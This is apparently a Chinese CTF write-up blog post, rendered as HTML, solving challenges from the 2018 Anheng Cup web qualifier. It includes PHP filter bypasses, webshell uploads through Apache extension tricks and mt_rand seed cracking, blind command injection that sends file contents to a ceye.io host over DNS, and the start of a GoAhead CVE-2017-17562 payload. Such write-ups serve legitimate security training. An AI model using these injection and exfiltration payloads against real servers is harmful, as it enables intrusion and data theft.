@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/avatar.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="Anemone's Blog" type="application/atom+xml">
+  <meta name="google-site-verification" content="Re5JdegRYzNFco-rC9lYIsvSWIgh5JvyfhuEaZCeFCk">
+  <meta name="baidu-site-verification" content="opTC8YN3Pn">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: 'GB90MXPJ1C',
+      apiKey: '05d808da3baf50ac2f2fad2dc3a3cd8f',
+      indexName: 'dev_blog',
+      hits: {"per_page":20},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="2018“安恒杯”WEB安全测试秋季资格赛，被老板批评“只会写文档的黑客”后，赶快刷几题找回点自信Orz。奇怪的恐龙特性进入靶机，可以看到网页源码1234567891011121314151617181920&amp;lt;?php highlight_file(__FILE__); ini_set(&quot;display_error&quot;, false);  error_reporting(0);  $str =">
+<meta name="keywords" content="PHP,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018“安恒杯”WEB安全测试秋季资格赛wp">
+<meta property="og:url" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/index.html">
+<meta property="og:site_name" content="Anemone&#39;s Blog">
+<meta property="og:description" content="2018“安恒杯”WEB安全测试秋季资格赛，被老板批评“只会写文档的黑客”后，赶快刷几题找回点自信Orz。奇怪的恐龙特性进入靶机，可以看到网页源码1234567891011121314151617181920&amp;lt;?php highlight_file(__FILE__); ini_set(&quot;display_error&quot;, false);  error_reporting(0);  $str =">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537705876135.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537705979278.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537706140903.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537706584108.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537707585778.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537792599445.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537792801839.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537793445399.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537792741495.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537793298457.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539350142198.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539350155700.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539350804776.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1538571783966.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539405059283.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539405263908.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539405581893.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539405664157.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539415423719.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539416324206.png">
+<meta property="og:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539347922000.png">
+<meta property="og:updated_time" content="2021-04-26T13:55:27.018Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018“安恒杯”WEB安全测试秋季资格赛wp">
+<meta name="twitter:description" content="2018“安恒杯”WEB安全测试秋季资格赛，被老板批评“只会写文档的黑客”后，赶快刷几题找回点自信Orz。奇怪的恐龙特性进入靶机，可以看到网页源码1234567891011121314151617181920&amp;lt;?php highlight_file(__FILE__); ini_set(&quot;display_error&quot;, false);  error_reporting(0);  $str =">
+<meta name="twitter:image" content="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537705876135.png">
+  <link rel="canonical" href="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>2018“安恒杯”WEB安全测试秋季资格赛wp | Anemone's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Anemone's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input" id="search-input"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+  
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://anemone.top/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Anemone">
+      <meta itemprop="description" content="关注Web安全、移动安全、Fuzz测试和机器学习">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Anemone's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">2018“安恒杯”WEB安全测试秋季资格赛wp
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2018-10-06 20:38:34" itemprop="dateCreated datePublished" datetime="2018-10-06T20:38:34+08:00">2018-10-06</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-26 21:55:27" itemprop="dateModified" datetime="2021-04-26T21:55:27+08:00">2021-04-26</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span id="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/" class="post-meta-item leancloud_visitors" data-flag-title="2018“安恒杯”WEB安全测试秋季资格赛wp" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>2018“安恒杯”WEB安全测试秋季资格赛，被老板批评“只会写文档的黑客”后，赶快刷几题找回点自信Orz。</p><h1 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h1><p>进入靶机，可以看到网页源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span> A_A,too small</span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+<p>首先要绕过<code>isset($_GET[&#39;A_A&#39;]) &amp;&amp; strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;)</code>，表面上说我们需要生成一个GET请求并且参数为A_A，但是第二个判断有要求GET请求的参数不能为A_A，看起来这是不可能的，但是由于PHP特性，会自动替换<code>.</code>为<code>_</code>，因此我们可以构造 <a href="http://ip/?A.A=xxx来绕过这个判断。" target="_blank" rel="noopener">http://ip/?A.A=xxx来绕过这个判断。</a></p>
+<p>接着我们需要绕过后面两个对$str的判断，即保证<code>$str&lt;9999999999 || (string)$str&gt;0==false</code>，这看起来写是不可能，但是在PHP中，我们可以使$str为一个数组，由于类型不同无法判断/强制转化，因此这样两个判断就都不成立了，这样我们就可以开心的getflag了。最后的GET请求为<code>http://114.55.36.69:8022/?A.A[]=1</code></p>
+<h1 id="ping也能把你ping挂"><a href="#ping也能把你ping挂" class="headerlink" title="ping也能把你ping挂"></a>ping也能把你ping挂</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>进入靶机，跳转到ping的页面，猜测有命令注入的问题</p>
+<p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537705876135.png" alt="1537705876135"></p>
+<p>尝试后发现<code>;</code>，空格被过滤，并且长度存在限制，这样我们只能用ls先看下当前目录有啥东西了：</p>
+<p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537705979278.png" alt="1537705979278"></p>
+<p>这里我们发现了上传入口：you_find_upload.php。</p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>进入<a href="http://114.55.36.69:6664/you_find_upload.php，看到可以查看源码，那就点进去查看吧" target="_blank" rel="noopener">http://114.55.36.69:6664/you_find_upload.php，看到可以查看源码，那就点进去查看吧</a></p>
+<p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537706140903.png" alt="1537706140903"></p>
+<p>前面那一串数字先不管，将后面的base64解码，得到上传的源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$type = <span class="keyword">array</span>(<span class="string">'gif'</span>,<span class="string">'jpg'</span>,<span class="string">'png'</span>);</span><br><span class="line">mt_srand((time() % rand(<span class="number">1</span>,<span class="number">100000</span>)%rand(<span class="number">1000</span>,<span class="number">9000</span>)));</span><br><span class="line"><span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    $check = getimagesize($FILES<span class="string">'file'</span>);</span><br><span class="line">    @$extension = end(explode(<span class="string">'.'</span>,$FILES<span class="string">'file'</span>));</span><br><span class="line">    <span class="keyword">if</span>(in_array($extension,$type))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'File is an image - '</span> . $check[<span class="string">'mime'</span>];</span><br><span class="line">        $filename = mt_rand().<span class="string">''</span>.$FILES<span class="string">'file'</span>;</span><br><span class="line">        move_uploaded_file($FILES<span class="string">'file'</span>, $filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(@preg_match(<span class="string">"/..\//"</span>,$GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你这个孩子，too young too simple"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">       @<span class="keyword">include</span> $_GET[<span class="string">'p'</span>].<span class="string">".php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>首先我们需要绕过文件类型限制，<code>in_array($extension,$type)</code>表示我们得上传后缀是gif，jpg或png的文件，这里复习一下上传绕过的普通套路：</p>
+<ol>
+<li><p>Apache</p>
+<p>1.php.jpg #从apache从右往左，直到可解析的文件后缀</p>
+</li>
+<li><p>Nginx</p>
+<p>1.php%001.jpg #00处截断</p>
+</li>
+<li><p>IIS</p>
+<p>a.asp;jpg    </p>
+<p>a.php. 和a.php[空格] #会自动去掉空格</p>
+</li>
+</ol>
+<p>注意到这里用的是Apache容器，那我们就上传个backdoor.php.jpg文件就好了</p>
+<p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537706584108.png" alt="1537706584108"></p>
+<p>看到这里我们已经上传成功了</p>
+<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>接下来我们需要确定上传后的文件名，再次查看源码，点击上传后，程序首先使用<code>mt_srand((time() % rand(1,100000)%rand(1000,9000)));</code>设置了随机数种子，并且打印第一个随机数<code>echo mt_rand();</code>；而上传文件名就是第二个随机数+原本文件名<code>$filename = mt_rand().&#39;&#39;.$FILES&#39;file&#39;;</code>，这样的伪随机数是存在问题的，我们可以根据第一个随机数暴力破解出随机数种子（注意到这里的种子∈[1000,9000]），然后再计算出第二个随机数。</p>
+<p>以第3步的上传结果为例，使用php_mt_seed.exe计算出随机数种子为5240.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">λ php_mt_seed.exe 823735129</span><br><span class="line">Found 0, trying 0 - 33554431, speed 0 seeds per second</span><br><span class="line">seed = 5240</span><br><span class="line">Found 1, trying 67108864 - 100663295, speed 71014670 seeds per second</span><br></pre></td></tr></table></figure>
+<p>接着推测出第二个随机数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">λ cat test.php</span><br><span class="line">&lt;?php</span><br><span class="line">mt_srand(5240);</span><br><span class="line"><span class="built_in">echo</span> mt_rand();</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="built_in">echo</span> mt_rand();</span><br><span class="line">?&gt;</span><br><span class="line">λ php test.php</span><br><span class="line">823735129</span><br><span class="line">288373614</span><br></pre></td></tr></table></figure>
+<p>那么我们的文件名就是288373614_backdoor.php.jpg</p>
+<p>后面就可以连菜刀<a href="http://114.55.36.69:6664/upload/288373614_backdoor.php.jpg，flag在根目录" target="_blank" rel="noopener">http://114.55.36.69:6664/upload/288373614_backdoor.php.jpg，flag在根目录</a></p>
+<p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537707585778.png" alt="1537707585778"></p>
+<h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>这题算是看着答案做出来的，不过思路很好，用到了DNS带外数据的知识，这里也记录一下：</p>
+<h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>首先还是扫描网站，可以看到网站泄露了一个robots.txt文件</p>
+<p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537792599445.png" alt="1537792599445"></p>
+<p>访问该文件，看到目录下存在index.txt，where_is_flag.php文件</p>
+<p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537792801839.png" alt="1537792801839"></p>
+<p>先看index.txt:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"where_is_flag.php"</span>);<span class="keyword">echo</span> <span class="string">"ping"</span>;$ip =(string)$_GET[<span class="string">'ping'</span>];$ip =str_replace(<span class="string">"&gt;"</span>,<span class="string">"0.0"</span>,$ip);system(<span class="string">"ping  "</span>.$ip);</span><br></pre></td></tr></table></figure>
+<p>可以看到存在命令执行，ping参数会直接拼接在ping命令后</p>
+<p>where_is_flag.php我们需要用命令执行才能看了。</p>
+<h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>尝试使用<code>http://114.55.36.69:8015/?ping=127.0.0.1</code>，发现网站未响应，这是因为后台正在循环ping，说明了命令执行成功。</p>
+<p>接着尝试使用<code>http://114.55.36.69:8015/?ping=-c 1 127.0.0.1</code>，可以发现网站网站后台并没有回显ping的结果，这说明虽然网站执行了命令，但是并不返回命令执行结果。</p>
+<p>那么如何拿到命令执行结果呢？第一个想到的是使用http请求，比如说<code>wget www.mysite.com/$(cat flag.php)</code>，但是尝试后发现无效，这可能是服务器并没有wget命令。</p>
+<p>正解是使用dns解析获取带外数据，这里推荐一个平台：<a href="http://ceye.io" target="_blank" rel="noopener">http://ceye.io</a>，登录之后可以获得一个专属的地址（假设为qwerty.ceye.io），那么如果我们<code>ping  &#96;whoami&#96;.qwerty.ceye.io</code>，由于ping的第一步是dns解析，所以在<a href="http://ceye.io/records/dns" target="_blank" rel="noopener">http://ceye.io/records/dns</a>就可以看whoami命令执行的结果：</p>
+<p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537793445399.png" alt="1537793445399"></p>
+<p>根据上述原理，我们可以获取where_is_flag.php，但是如果文件内容中有空格，我们的ping命令就不能执行了，所以用sed命令将空格换成sspacee。这样我们ping参数为：<br><code><a href="http://114.55.36.69:8015/?ping=" target="_blank" rel="noopener">http://114.55.36.69:8015/?ping=</a> &#96;cat where_is_flag.php|sed ‘s/\s/sspacee/g’&#96;.0ri9zr.ceye.io</code></p>
+<p>同时在ceye中可以看到文件内容了</p>
+<p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537792741495.png" alt="1537792741495"></p>
+<p>接着访问dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php，如法炮制即可：</p>
+<p><code><a href="http://114.55.36.69:8015/?ping=" target="_blank" rel="noopener">http://114.55.36.69:8015/?ping=</a> &#96;cat dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php|sed ‘s/\s/sspacee/g’&#96;.0ri9zr.ceye.io</code></p>
+<p>可以看到flag：</p>
+<p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537793298457.png" alt="1537793298457"></p>
+<p><strong>拓展：</strong> 不止是命令执行，dns的带外数据还能传很多东西比如说SQL注入、XXE，详细可以看<a href="http://ceye.io/payloads" target="_blank" rel="noopener">http://ceye.io/payloads</a>，Github上也有了利用该方法进行SQL注入的工具（<a href="https://github.com/ADOOO/DnslogSqlinj" target="_blank" rel="noopener">https://github.com/ADOOO/DnslogSqlinj</a>)</p>
+<h1 id="ProxyError"><a href="#ProxyError" class="headerlink" title="ProxyError"></a>ProxyError</h1><p>修改Host:192.168.5.132</p>
+<h1 id="新瓶装旧酒"><a href="#新瓶装旧酒" class="headerlink" title="新瓶装旧酒"></a>新瓶装旧酒</h1><h2 id="0x01-代码审计-文件上传"><a href="#0x01-代码审计-文件上传" class="headerlink" title="0x01 代码审计+文件上传"></a>0x01 代码审计+文件上传</h2><p>这里可以看到需要上传一个zip文件：</p>
+<p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539350142198.png" alt="1539350142198"></p>
+<p>这里看到zip文件中需要包含一个图片后缀：</p>
+<p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539350155700.png" alt="1539350155700"></p>
+<p>根据apache的特性，使用大马1.pHp.png(注意到文件名不能有<code>.ph</code>)，并且压缩成zip上传，发现<code>flag.php</code>。</p>
+<p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539350804776.png" alt="1539350804776"></p>
+<h1 id="GOGOGO"><a href="#GOGOGO" class="headerlink" title="GOGOGO"></a>GOGOGO</h1><h2 id="0x01-GoAhead-CVE-2017-17562"><a href="#0x01-GoAhead-CVE-2017-17562" class="headerlink" title="0x01 GoAhead CVE-2017-17562"></a>0x01 GoAhead CVE-2017-17562</h2><p>实际上腾讯的<a href="https://slab.qq.com/news/tech/1701.html" target="_blank" rel="noopener">“开源Web服务器GoAhead漏洞CVE-2017-17562分析“</a> 一文已经对此漏洞进行了详细解释，这里只概括的说一下：</p>
+<ol>
+<li>因为cgiHandler的过滤不当，导致LD_PRELOAD变量可控，而程序会读取LD_PRELOAD变量记录的文件路径并且执行文件代码；</li>
+<li>launchCgi函数调用系统函数dup2()将stdin文件描述符指向了POST请求数据对应的临时文件。</li>
+</ol>
+<p>从发送payload的命令可以看到，我们的POST中控制了两个输入，一个是LOAD_PRELOAD参数（将它设置为了/proc/self/fd/0），一个是POST的data（将它设置为了我们编译生成的动态链接库）。/proc/self/fd/0 是Linux的伪文件系统文件，实际上指的是stdin，以下命令的执行结果可以说明这一点：</p>
+<p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1538571783966.png" alt="1538571783966"></p>
+<p>这样结合第一条，即程序会从我们标准输入中取代码执行，又因为第二条，我们的标准输入被定向到了POST的临时文件中，具体来说，即定向到了我们的payload.so文件上，这样整个原理就走通了。</p>
+<h2 id="0x02-复现CVE"><a href="#0x02-复现CVE" class="headerlink" title="0x02 复现CVE"></a>0x02 复现CVE</h2><p>准备payload</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"><span 